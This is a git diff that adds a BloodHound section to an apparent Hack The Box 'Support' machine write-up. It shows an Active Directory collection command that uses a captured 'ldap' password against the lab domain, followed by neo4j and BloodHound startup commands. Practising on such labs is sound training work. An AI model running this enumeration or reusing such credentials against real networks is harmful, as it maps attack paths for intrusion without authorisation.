@@ -298,3 +298,17 @@ crackmapexec smb support.htb -d support -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tR
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/81d35e30-1687-4770-8673-e08eebc615d4)
 
+## BloodHound
+```shell
+bloodhound-python -c ALL -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174 --dns-tcp
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9fc714d2-2503-48c0-abf0-55e0b04c5fa4)
+
+```shell
+sudo neo4j console
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1d04add6-2a5a-46d4-9bf8-473fba9db595)
+
+```shell
+bloodhound
+```
